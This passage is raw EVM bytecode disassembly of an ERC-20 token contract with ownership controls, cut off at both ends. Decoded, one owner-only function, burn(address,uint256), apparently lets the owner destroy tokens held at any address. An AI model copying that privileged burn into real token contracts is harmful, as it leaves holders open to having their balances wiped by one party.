0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH3 0x66A JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0x94280D6200000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH3 0x661 SWAP2 SWAP1 PUSH3 0xBB4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP2 PUSH1 0x1 PUSH1 0x0 DUP7 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP1 ISZERO PUSH3 0x75A JUMPI DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 DUP5 PUSH1 0x40 MLOAD PUSH3 0x751 SWAP2 SWAP1 PUSH3 0xCD4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH3 0x77A DUP2 PUSH3 0x765 JUMP JUMPDEST DUP2 EQ PUSH3 0x786 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH3 0x79A DUP2 PUSH3 0x76F JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x7CD DUP3 PUSH3 0x7A0 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH3 0x7DF DUP2 PUSH3 0x7C0 JUMP JUMPDEST DUP2 EQ PUSH3 0x7EB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH3 0x7FF DUP2 PUSH3 0x7D4 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH3 0x81F JUMPI PUSH3 0x81E PUSH3 0x760 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH3 0x82F DUP6 DUP3 DUP7 ADD PUSH3 0x789 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH3 0x842 DUP6 DUP3 DUP7 ADD PUSH3 0x7EE JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x2 DUP3 DIV SWAP1 POP PUSH1 0x1 DUP3 AND DUP1 PUSH3 0x8CE JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 SUB PUSH3 0x8E4 JUMPI PUSH3 0x8E3 PUSH3 0x886 JUMP JUMPDEST JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP DUP2 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 PUSH1 0x1F DUP4 ADD DIV SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 SHL SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x8 DUP4 MUL PUSH3 0x94E PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 PUSH3 0x90F JUMP JUMPDEST PUSH3 0x95A DUP7 DUP4 PUSH3 0x90F JUMP JUMPDEST SWAP6 POP DUP1 NOT DUP5 AND SWAP4 POP DUP1 DUP7 AND DUP5 OR SWAP3 POP POP POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x99D PUSH3 0x997 PUSH3 0x991 DUP5 PUSH3 0x765 JUMP JUMPDEST PUSH3 0x972 JUMP JUMPDEST PUSH3 0x765 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH3 0x9B9 DUP4 PUSH3 0x97C JUMP JUMPDEST PUSH3 0x9D1 PUSH3 0x9C8 DUP3 PUSH3 0x9A4 JUMP JUMPDEST DUP5 DUP5 SLOAD PUSH3 0x91C JUMP JUMPDEST DUP3 SSTORE POP POP POP POP JUMP JUMPDEST PUSH1 0x0 SWAP1 JUMP JUMPDEST PUSH3 0x9E8 PUSH3 0x9D9 JUMP JUMPDEST PUSH3 0x9F5 DUP2 DUP5 DUP5 PUSH3 0x9AE JUMP JUMPDEST POP POP POP JUMP JUMPDEST JUMPDEST DUP2 DUP2 LT ISZERO PUSH3 0xA1D JUMPI PUSH3 0xA11 PUSH1 0x0 DUP3 PUSH3 0x9DE JUMP JUMPDEST PUSH1 0x1 DUP2 ADD SWAP1 POP PUSH3 0x9FB JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x1F DUP3 GT ISZERO PUSH3 0xA6C JUMPI PUSH3 0xA36 DUP2 PUSH3 0x8EA JUMP JUMPDEST PUSH3 0xA41 DUP5 PUSH3 0x8FF JUMP JUMPDEST DUP2 ADD PUSH1 0x20 DUP6 LT ISZERO PUSH3 0xA51 JUMPI DUP2 SWAP1 POP JUMPDEST PUSH3 0xA69 PUSH3 0xA60 DUP6 PUSH3 0x8FF JUMP JUMPDEST DUP4 ADD DUP3 PUSH3 0x9FA JUMP JUMPDEST POP POP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 SHR SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0xA91 PUSH1 0x0 NOT DUP5 PUSH1 0x8 MUL PUSH3 0xA71 JUMP JUMPDEST NOT DUP1 DUP4 AND SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0xAAC DUP4 DUP4 PUSH3 0xA7E JUMP JUMPDEST SWAP2 POP DUP3 PUSH1 0x2 MUL DUP3 OR SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH3 0xAC7 DUP3 PUSH3 0x84C JUMP JUMPDEST PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH3 0xAE3 JUMPI PUSH3 0xAE2 PUSH3 0x857 JUMP JUMPDEST JUMPDEST PUSH3 0xAEF DUP3 SLOAD PUSH3 0x8B5 JUMP JUMPDEST PUSH3 0xAFC DUP3 DUP3 DUP6 PUSH3 0xA21 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 SWAP1 POP PUSH1 0x1F DUP4 GT PUSH1 0x1 DUP2 EQ PUSH3 0xB34 JUMPI PUSH1 0x0 DUP5 ISZERO PUSH3 0xB1F JUMPI DUP3 DUP8 ADD MLOAD SWAP1 POP JUMPDEST PUSH3 0xB2B DUP6 DUP3 PUSH3 0xA9E JUMP JUMPDEST DUP7 SSTORE POP PUSH3 0xB9B JUMP JUMPDEST PUSH1 0x1F NOT DUP5 AND PUSH3 0xB44 DUP7 PUSH3 0x8EA JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP3 DUP2 LT ISZERO PUSH3 0xB6E JUMPI DUP5 DUP10 ADD MLOAD DUP3 SSTORE PUSH1 0x1 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP6 ADD SWAP5 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH3 0xB47 JUMP JUMPDEST DUP7 DUP4 LT ISZERO PUSH3 0xB8E JUMPI DUP5 DUP10 ADD MLOAD PUSH3 0xB8A PUSH1 0x1F DUP10 AND DUP3 PUSH3 0xA7E JUMP JUMPDEST DUP4 SSTORE POP JUMPDEST PUSH1 0x1 PUSH1 0x2 DUP9 MUL ADD DUP9 SSTORE POP POP POP JUMPDEST POP POP POP POP POP POP JUMP JUMPDEST PUSH3 0xBAE DUP2 PUSH3 0x7C0 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH3 0xBCB PUSH1 0x0 DUP4 ADD DUP5 PUSH3 0xBA3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH3 0xC0D DUP3 PUSH3 0x765 JUMP JUMPDEST SWAP2 POP PUSH3 0xC1A DUP4 PUSH3 0x765 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 MUL PUSH3 0xC2A DUP2 PUSH3 0x765 JUMP JUMPDEST SWAP2 POP DUP3 DUP3 DIV DUP5 EQ DUP4 ISZERO OR PUSH3 0xC44 JUMPI PUSH3 0xC43 PUSH3 0xBD1 JUMP JUMPDEST JUMPDEST POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0xC58 DUP3 PUSH3 0x765 JUMP JUMPDEST SWAP2 POP PUSH3 0xC65 DUP4 PUSH3 0x765 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP DUP1 DUP3 GT ISZERO PUSH3 0xC80 JUMPI PUSH3 0xC7F PUSH3 0xBD1 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH3 0xC91 DUP2 PUSH3 0x765 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH3 0xCAE PUSH1 0x0 DUP4 ADD DUP7 PUSH3 0xBA3 JUMP JUMPDEST PUSH3 0xCBD PUSH1 0x20 DUP4 ADD DUP6 PUSH3 0xC86 JUMP JUMPDEST PUSH3 0xCCC PUSH1 0x40 DUP4 ADD DUP5 PUSH3 0xC86 JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH3 0xCEB PUSH1 0x0 DUP4 ADD DUP5 PUSH3 0xC86 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x11EF DUP1 PUSH3 0xD01 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0xCF JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x715018A6 GT PUSH2 0x8C JUMPI DUP1 PUSH4 0x9DC29FAC GT PUSH2 0x66 JUMPI DUP1 PUSH4 0x9DC29FAC EQ PUSH2 0x204 JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x220 JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x250 JUMPI DUP1 PUSH4 0xF2FDE38B EQ PUSH2 0x280 JUMPI PUSH2 0xCF JUMP JUMPDEST DUP1 PUSH4 0x715018A6 EQ PUSH2 0x1BE JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x1C8 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x1E6 JUMPI PUSH2 0xCF JUMP JUMPDEST DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0xD4 JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0xF2 JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x122 JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x140 JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x170 JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x18E JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xDC PUSH2 0x29C JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xE9 SWAP2 SWAP1 PUSH2 0xE01 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x10C PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x107 SWAP2 SWAP1 PUSH2 0xEBC JUMP JUMPDEST PUSH2 0x32E JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x119 SWAP2 SWAP1 PUSH2 0xF17 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x12A PUSH2 0x351 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x137 SWAP2 SWAP1 PUSH2 0xF41 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x15A PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x155 SWAP2 SWAP1 PUSH2 0xF5C JUMP JUMPDEST PUSH2 0x35B JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x167 SWAP2 SWAP1 PUSH2 0xF17 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x178 PUSH2 0x38A JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x185 SWAP2 SWAP1 PUSH2 0xFCB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1A8 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x1A3 SWAP2 SWAP1 PUSH2 0xFE6 JUMP JUMPDEST PUSH2 0x393 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1B5 SWAP2 SWAP1 PUSH2 0xF41 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1C6 PUSH2 0x3DB JUMP JUMPDEST STOP JUMPDEST PUSH2 0x1D0 PUSH2 0x3EF JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1DD SWAP2 SWAP1 PUSH2 0x1022 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1EE PUSH2 0x419 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1FB SWAP2 SWAP1 PUSH2 0xE01 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x21E PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x219 SWAP2 SWAP1 PUSH2 0xEBC JUMP JUMPDEST PUSH2 0x4AB JUMP JUMPDEST STOP JUMPDEST PUSH2 0x23A PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x235 SWAP2 SWAP1 PUSH2 0xEBC JUMP JUMPDEST PUSH2 0x4D4 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x247 SWAP2 SWAP1 PUSH2 0xF17 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x26A PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x265 SWAP2 SWAP1 PUSH2 0x103D JUMP JUMPDEST PUSH2 0x4F7 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x277 SWAP2 SWAP1 PUSH2 0xF41 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x29A PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x295 SWAP2 SWAP1 PUSH2 0xFE6 JUMP JUMPDEST PUSH2 0x57E JUMP JUMPDEST STOP JUMPDEST PUSH1 0x60 PUSH1 0x3 DUP1 SLOAD PUSH2 0x2AB SWAP1 PUSH2 0x10AC JUMP JUMPDEST DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH2 0x2D7 SWAP1 PUSH2 0x10AC JUMP JUMPDEST DUP1 ISZERO PUSH2 0x324 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x2F9 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x324 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x307 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x339 PUSH2 0x604 JUMP JUMPDEST SWAP1 POP PUSH2 0x346 DUP2 DUP6 DUP6 PUSH2 0x60C JUMP JUMPDEST PUSH1 0x1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 SLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x366 PUSH2 0x604 JUMP JUMPDEST SWAP1 POP PUSH2 0x373 DUP6 DUP3 DUP6 PUSH2 0x61E JUMP JUMPDEST PUSH2 0x37E DUP6 DUP6 DUP6 PUSH2 0x6B2 JUMP JUMPDEST PUSH1 0x1 SWAP2 POP POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x12 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x3E3 PUSH2 0x7A6 JUMP JUMPDEST PUSH2 0x3ED PUSH1 0x0 PUSH2 0x82D JUMP JUMPDEST JUMP JUMPDEST PUSH1 0x0 PUSH1 0x5 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x4 DUP1 SLOAD PUSH2 0x428 SWAP1 PUSH2 0x10AC JUMP JUMPDEST DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH2 0x454 SWAP1 PUSH2 0x10AC JUMP JUMPDEST DUP1 ISZERO PUSH2 0x4A1 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x476 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x4A1 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x484 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH2 0x4B3 PUSH2 0x7A6 JUMP JUMPDEST PUSH2 0x4D0 DUP3 PUSH8 0xDE0B6B3A7640000 DUP4 PUSH2 0x4CB SWAP2 SWAP1 PUSH2 0x110C JUMP JUMPDEST PUSH2 0x8F3 JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x4DF PUSH2 0x604 JUMP JUMPDEST SWAP1 POP PUSH2 0x4EC DUP2 DUP6 DUP6 PUSH2 0x6B2 JUMP JUMPDEST PUSH1 0x1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x586 PUSH2 0x7A6 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0x5F8 JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0x1E4FBDF700000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x5EF SWAP2 SWAP1 PUSH2 0x1022 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x601 DUP2 PUSH2 0x82D JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 CALLER SWAP1 POP SWAP1 JUMP JUMPDEST PUSH2 0x619 DUP4 DUP4 DUP4 PUSH1 0x1 PUSH2 0x975 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x62A DUP5 DUP5 PUSH2 0x4F7 JUMP JUMPDEST SWAP1 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP2 EQ PUSH2 0x6AC JUMPI DUP2 DUP2 LT ISZERO PUSH2 0x69C JUMPI DUP3 DUP2 DUP4 PUSH1 0x40 MLOAD PUSH32 0xFB8F41B200000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x693 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x114E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x6AB DUP5 DUP5 DUP5 DUP5 SUB PUSH1 0x0 PUSH2 0x975 JUMP JUMPDEST JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0x724 JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0x96C6FD1E00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x71B SWAP2 SWAP1 PUSH2 0x1022 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0x796 JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0xEC442F0500000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x78D SWAP2 SWAP1 PUSH2 0x1022 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x7A1 DUP4 DUP4 DUP4 PUSH2 0xB4C JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH2 0x7AE PUSH2 0x604 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x7CC PUSH2 0x3EF JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x82B JUMPI PUSH2 0x7EF PUSH2 0x604 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH32 0x118CDAA700000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x822 SWAP2 SWAP1 PUSH2 0x1022 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST JUMP JUMPDEST PUSH1 0x0 PUSH1 0x5 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP DUP2 PUSH1 0x5 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SUB PUSH2 0x965 JUMPI PUSH1 0x0 PUSH1 0x40 MLOAD PUSH32 0x96C6FD1E00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x95C SWAP2 SWAP1 PUSH2 0x1022 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 